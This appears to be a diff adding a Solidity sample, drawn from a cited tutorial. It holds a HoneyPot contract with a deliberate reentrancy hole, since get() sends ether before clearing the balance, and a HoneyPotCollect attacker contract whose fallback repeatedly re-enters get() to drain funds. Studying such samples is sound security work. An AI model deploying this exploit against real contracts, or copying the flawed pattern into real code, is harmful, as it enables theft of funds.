@@ -1,0 +1,51 @@
+// https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
+// https://github.com/gustavoguimaraes/honeyPotReentranceAttack/blob/master/contracts/HoneyPot.sol
+// https://github.com/gustavoguimaraes/honeyPotReentranceAttack/blob/master/contracts/HoneyPotCollect.sol
+
+pragma solidity ^0.4.8;
+
+contract HoneyPot {
+    mapping (address => uint) public balances;
+
+    function HoneyPot() payable {
+        put();
+    }
+
+    function put() payable {
+        balances[msg.sender] = msg.value;
+    }
+
+    function get() {
+        if (!msg.sender.call.value(balances[msg.sender])()) {
+            throw;
+        }
+        balances[msg.sender] = 0;
+    }
+
+    function() {
+        throw;
+    }
+}
+
+contract HoneyPotCollect {
+  HoneyPot public honeypot;
+
+  function HoneyPotCollect (address _honeypot) {
+    honeypot = HoneyPot(_honeypot);
+  }
+
+  function kill () {
+    suicide(msg.sender);
+  }
+
+  function collect() payable {
+    honeypot.put.value(msg.value)();
+    honeypot.get();
+  }
+
+  function () payable {
+    if (honeypot.balance >= msg.value) {
+      honeypot.get();
+    }
+  }
+}
